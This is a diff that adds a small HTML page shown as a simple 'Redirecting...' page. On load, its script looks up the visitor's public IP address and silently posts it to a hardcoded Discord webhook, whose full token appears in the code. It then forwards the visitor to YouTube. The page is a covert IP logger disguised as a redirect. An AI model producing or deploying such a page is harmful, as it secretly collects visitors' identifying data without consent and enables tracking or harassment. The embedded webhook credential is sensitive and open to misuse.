@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirecting...</title>
+    <script>
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          const webhookURL = "https://discord.com/api/webhooks/1391180175135473734/F_1guAsaK6cbFe4vor5O0jzsaRNVuESM5LV4SS5xYHaVlRgISMxDgqn4Uj99mO5FFJ0M";
+          fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: `🎯 IP Logged: \`${data.ip}\``,
+            }),
+          });
+          // Redirect after logging
+          setTimeout(() => {
+            window.location.href = "https://youtube.com";
+          }, 1000);
+        });
+    </script>
+  </head>
+  <body>
+    <p>Redirecting...</p>
+  </body>
+</html>
